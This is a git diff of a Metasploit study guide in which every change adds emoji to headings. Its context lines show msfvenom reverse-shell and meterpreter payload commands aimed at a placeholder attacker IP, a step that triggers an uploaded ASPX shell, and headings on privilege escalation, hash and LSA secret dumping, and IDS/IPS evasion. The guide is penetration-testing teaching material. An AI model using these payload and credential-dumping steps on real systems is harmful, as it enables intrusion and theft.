@@ -58,7 +58,7 @@ msfconsole -q
 <details>
 <summary><h2>📜 Introduction</h2></summary>
 
-**Modules**
+**📦 Modules**
 
 <table width="100%">
 <tr>
@@ -80,7 +80,7 @@ ls /usr/share/metasploit-framework/modules
 </tr>
 </table>
 
-**Plugins**
+**🔌 Plugins**
 
 <table width="100%">
 <tr>
@@ -102,7 +102,7 @@ ls /usr/share/metasploit-framework/plugins/
 </tr>
 </table>
 
-**Scripts**
+**📜 Scripts**
 
 <table width="100%">
 <tr>
@@ -124,7 +124,7 @@ ls /usr/share/metasploit-framework/scripts/
 </tr>
 </table>
 
-**Tools**
+**🔧 Tools**
 
 <table width="100%">
 <tr>
@@ -154,7 +154,7 @@ ls /usr/share/metasploit-framework/tools/
 <summary><h2>🧩 MSF Components</h2></summary>
 
 <details>
-<summary><h3>Modules</h3></summary>
+<summary><h3>📦 Modules</h3></summary>
 
 Metasploit modules are pre-built scripts designed for specific tasks, each with corresponding functions that have been thoroughly developed and tested in real-world scenarios.
 
@@ -232,7 +232,7 @@ The Name tag describes the module's core function—the specific action it perfo
 </details>
 
 <details>
-<summary><h4>Search</h4></summary>
+<summary><h4>🔍 Search</h4></summary>
 
 **Search function**
 
@@ -347,7 +347,7 @@ grep meterpreter grep reverse_tcp show payloads
 </details>
 
 <details>
-<summary><h4>Select</h4></summary>
+<summary><h4>🎯 Select</h4></summary>
 
 **Select Module**
 
@@ -396,7 +396,7 @@ options
 </details>
 
 <details>
-<summary><h4>Set</h4></summary>
+<summary><h4>⚙️ Set</h4></summary>
 
 **Target Specification**
 
@@ -560,7 +560,7 @@ info
 </details>
 
 <details>
-<summary><h4>Exploit Execution</h4></summary>
+<summary><h4>💥 Exploit Execution</h4></summary>
 
 **Execute**
 
@@ -589,7 +589,7 @@ run
 </details>
 
 <details>
-<summary><h3>Common Payloads</h3></summary>
+<summary><h3>💣 Common Payloads</h3></summary>
 
 The table below contains the most common payloads used for Windows machines and their respective descriptions.
 
@@ -611,7 +611,7 @@ The table below contains the most common payloads used for Windows machines and 
 </details>
 
 <details>
-<summary><h3>Targets</h3></summary>
+<summary><h3>🎯 Targets</h3></summary>
 
 The **Target** field specifies particular operating system versions that the exploit module has been adapted to work with. These unique OS identifiers allow the module to customize its execution for specific system versions.
 
@@ -683,7 +683,7 @@ set target 6
 </details>
 
 <details>
-<summary><h3>Payloads</h3></summary>
+<summary><h3>💣 Payloads</h3></summary>
 
 In Metasploit, a payload is a module that enables successful exploitation, typically by establishing a shell session for the attacker.
 
@@ -712,21 +712,21 @@ show payloads
 The framework provides three distinct payload types:
 
 <details>
-<summary><h4>1. Singles</h4></summary>
+<summary><h4>🎯 1. Singles</h4></summary>
 
 A _Single_ payload contains the exploit and the entire shellcode for the selected task. Inline payloads are by design more stable than their counterparts because they contain everything all-in-one. A Single payload can be as simple as adding a user to the target system or booting up a process.
 
 </details>
 
 <details>
-<summary><h4>2. Stagers</h4></summary>
+<summary><h4>🤝 2. Stagers</h4></summary>
 
 _Stager_ payloads work with Stage payloads to perform a specific task. A Stager is waiting on the attacker machine, ready to establish a connection to the victim host once the stage completes its run on the remote host. Stagers are typically used to set up a network connection between the attacker and victim and are designed to be small and reliable.
 
 </details>
 
 <details>
-<summary><h4>3. Stages</h4></summary>
+<summary><h4>💀 3. Stages</h4></summary>
 
 _Stages_ are payload components that are downloaded by stager's modules.
 
@@ -742,7 +742,7 @@ Payload stages automatically use middle stagers:
 </details>
 
 <details>
-<summary><h3>Staged Payloads</h3></summary>
+<summary><h3>🤝 Staged Payloads</h3></summary>
 
 A staged payload modularizes the exploitation process by separating functionality into discrete components. Each stage performs specific tasks while chaining together to execute the complete attack.
 
@@ -752,7 +752,7 @@ Like all payloads, its objectives are twofold:
 
 2. Maintain minimal footprint to evade AV/IPS detection
 
-**Connection Methodology:**
+**🤝 Connection Methodology:**
 
 - Stage 0 (Reverse Connection):
   - The victim host initiates contact back to the attacker
@@ -769,7 +769,7 @@ Like all payloads, its objectives are twofold:
   - Typically provides full shell access and control
 
 <details>
-<summary><h4>Meterpreter Payload</h4></summary>
+<summary><h4>💀 Meterpreter Payload</h4></summary>
 
 The Meterpreter payload is a specific type of multi-faceted payload that:
 
@@ -785,7 +785,7 @@ The Meterpreter payload is a specific type of multi-faceted payload that:
 </details>
 
 <details>
-<summary><h3>Encoders</h3></summary>
+<summary><h3>🎭 Encoders</h3></summary>
 
 Encoders have assisted with making payloads compatible with different processor architectures while at the same time helping with antivirus evasion. These architectures include:
 
@@ -797,7 +797,7 @@ Encoders have assisted with making payloads compatible with different processor 
 
 Encoders were packed separately from the msfconsole script and were called **msfpayload** and **msfencode**. These two tools are located in _/usr/share/framework2/_.
 
-**Generating Payload - Without Encoding**
+**🔨 Generating Payload - Without Encoding**
 
 <table width="100%">
 <tr>
@@ -819,7 +819,7 @@ msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=<ATTACKER 
 </tr>
 </table>
 
-**Generating Payload - With Encoding**
+**🎭 Generating Payload - With Encoding**
 
 <table width="100%">
 <tr>
@@ -890,7 +890,7 @@ As anticipated, most commercial antivirus solutions can detect these payloads du
 </details>
 
 <details>
-<summary><h3>Databases</h3></summary>
+<summary><h3>🗄️ Databases</h3></summary>
 
 The Metasploit Framework utilizes databases within msfconsole to systematically store and manage penetration testing results. The system features native PostgreSQL integration, providing:
 
@@ -903,7 +903,7 @@ The Metasploit Framework utilizes databases within msfconsole to systematically 
 - Seamless import/export functionality for integration with external tools
 
 <details>
-<summary><h4>Setting up the Database</h4></summary>
+<summary><h4>🗄️ Setting up the Database</h4></summary>
 
 **PostgreSQL Status**
 
@@ -1161,7 +1161,7 @@ db_export -f xml backup.xml
 </details>
 
 <details>
-<summary><h3>Plugins</h3></summary>
+<summary><h3>🔌 Plugins</h3></summary>
 
 Metasploit plugins interact directly with the framework's API, enabling deep integration and control. They serve three primary purposes:
 
@@ -1273,7 +1273,7 @@ help
 <summary><h2>🤝 MFS Sessions</h2></summary>
 
 <details>
-<summary><h3>Sessions</h3></summary>
+<summary><h3>🖥️ Sessions</h3></summary>
 
 **Multi-Session Management in MSFconsole**
 
@@ -1285,7 +1285,7 @@ MSFconsole supports concurrent management of multiple modules and sessions. Key 
 
 3. Job Conversion – Convert sessions into persistent background jobs
 
-**Important Notes:**
+**⚠️ Important Notes:**
 
 - Backgrounded sessions maintain active connections to target hosts
 
@@ -1304,7 +1304,7 @@ Active sessions can be backgrounded when they maintain communication with the ta
 
 - Deploy additional modules without session interruption
 
-**Backgrounding Methods:**
+**🔀 Backgrounding Methods:**
 
 1. Keyboard Shortcut: CTRL+Z (Universal)
 
@@ -1367,7 +1367,7 @@ sessions -i 1
 </details>
 
 <details>
-<summary><h3>Jobs</h3></summary>
+<summary><h3>⚙️ Jobs</h3></summary>
 
 When an active exploit occupies a port needed for another module, improper termination (e.g., CTRL+C) leaves the port bound. Instead, follow this procedure:
 
@@ -1462,12 +1462,12 @@ exploit -j
 </details>
 
 <details>
-<summary><h3>Meterpreter</h3></summary>
+<summary><h3>💀 Meterpreter</h3></summary>
 
 The Meterpreter payload is an advanced, modular attack platform that employs sophisticated techniques to maintain stealth and persistence:
 
 <details>
-<summary><h4>Objectives</h4></summary>
+<summary><h4>🎯 Objectives</h4></summary>
 
 - Provide a stable, extensible platform for internal host enumeration
 
@@ -1478,7 +1478,7 @@ The Meterpreter payload is an advanced, modular attack platform that employs sop
 </details>
 
 <details>
-<summary><h4>Capabilites</h4></summary>
+<summary><h4>🛠️ Capabilites</h4></summary>
 
 - Utilizes reflective DLL injection for stable, low-detectability implants
 
@@ -1516,7 +1516,7 @@ The Meterpreter payload is an advanced, modular attack platform that employs sop
     </details>
 
 <details>
-<summary><h4>Using Meterpreter</h4></summary>
+<summary><h4>💀 Using Meterpreter</h4></summary>
 
 **Displays a list of available Meterpreter commands and their descriptions.**
 
@@ -1676,9 +1676,9 @@ lsa_dump_secrets
 </details>
 
 <details>
-<summary><h4>Example Compromise Walkthrough</h4></summary>
+<summary><h4>🎬 Example Compromise Walkthrough</h4></summary>
 
-**MSF - Meterpreter Migration**
+**💀 MSF - Meterpreter Migration**
 
 <table width="100%">
 <tr>
@@ -1927,7 +1927,7 @@ run
 </tr>
 </table>
 
-**MSF - Privilege Escalation**
+**💀 MSF - Privilege Escalation**
 
 <table width="100%">
 <tr>
@@ -2005,7 +2005,7 @@ Server username: NT AUTHORITY\SYSTEM
 </tr>
 </table>
 
-**MSF - Dumping Hashes**
+**🔓 MSF - Dumping Hashes**
 
 <table width="100%">
 <tr>
@@ -2100,7 +2100,7 @@ User : IUSR_GRANPA
 </tr>
 </table>
 
-**MSF - Meterpreter LSA Secrets Dump**
+**🔓 MSF - Meterpreter LSA Secrets Dump**
 
 <table width="100%">
 <tr>
@@ -2167,7 +2167,7 @@ cur/hex : 01 00 00 00 7a 3b 72 f3 cd ed 29 ce b8 09 5b b0 e2 63 73 8a ab c6 ca 4
 <summary><h2>➕ Additional Features</h2></summary>
 
 <details>
-<summary><h3>Importing Modules</h3></summary>
+<summary><h3>📥 Importing Modules</h3></summary>
 
 **Required Formatting**
 
@@ -2200,7 +2200,7 @@ cur/hex : 01 00 00 00 7a 3b 72 f3 cd ed 29 ce b8 09 5b b0 e2 63 73 8a ab c6 ca 4
      - ✅ Valid: my_module.rb
 
 <details>
-<summary><h4>Full Upgrade</h4></summary>
+<summary><h4>⬆️ Full Upgrade</h4></summary>
 
 To incorporate community-developed modules into your Metasploit installation:
 
@@ -2237,7 +2237,7 @@ This fetches all newly integrated:
 </details>
 
 <details>
-<summary><h4>Manual</h4></summary>
+<summary><h4>📋 Manual</h4></summary>
 
 1. **Source** Selection
    - Prioritize ExploitDB for verified modules
@@ -2294,12 +2294,12 @@ search type:exploit <module_name>
 </details>
 
 <details>
-<summary><h3>Introduction to MSFVenom</h3></summary>
+<summary><h3>🔨 Introduction to MSFVenom</h3></summary>
 
 MSFVenom replaces the legacy MSFPayload and MSFEncode utilities, combining their functionality into a single powerful tool. As the modern payload generation framework for Metasploit, it enables security professionals to craft highly customizable and evasive payloads while maintaining full integration with msfconsole for exploit delivery.
 
 <details>
-<summary><h4>Creating Our Payloads</h4></summary>
+<summary><h4>🔨 Creating Our Payloads</h4></summary>
 
 **Generating Payload**
 
@@ -2323,7 +2323,7 @@ msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ATTACKER IP> LPORT=4444 -f as
 </tr>
 </table>
 
-**MSF - Setting Up Multi/Handler**
+**🎣 MSF - Setting Up Multi/Handler**
 
 <table width="100%">
 <tr>
@@ -2383,7 +2383,7 @@ run
 </tr>
 </table>
 
-**Executing the Payload**
+**💥 Executing the Payload**
 
 _Navigate to the upload path_ (e.g. http://TARGET/reverse_shell.aspx) to trigger the connection above.
 
@@ -2418,7 +2418,7 @@ Server username: IIS APPPOOL\Web
 </tr>
 </table>
 
-**MSF - Local Exploit Suggester**
+**🔍 MSF - Local Exploit Suggester**
 
 <table width="100%">
 <tr>
@@ -2489,7 +2489,7 @@ run
 </tr>
 </table>
 
-**MSF - Local Privilege Escalation**
+**💀 MSF - Local Privilege Escalation**
 
 <table width="100%">
 <tr>
@@ -2565,7 +2565,7 @@ Server username: NT AUTHORITY\SYSTEM
 </details>
 
 <details>
-<summary><h3>Firewall and IDS/IPS evasion</h3></summary>
+<summary><h3>👻 Firewall and IDS/IPS evasion</h3></summary>
 
 <details>
 <summary><h4>Terms</h4></summary>
@@ -2594,7 +2594,7 @@ There are multiple ways to match an event or object with a security policy entry
 </details>
 
 <details>
-<summary><h4>Evasion Techniques</h4></summary>
+<summary><h4>👻 Evasion Techniques</h4></summary>
 
 > This section covers evasion at a high level. Be on the lookout for later modules that will dig deeper into the knowledge needed to perform evasion more effectively.
 
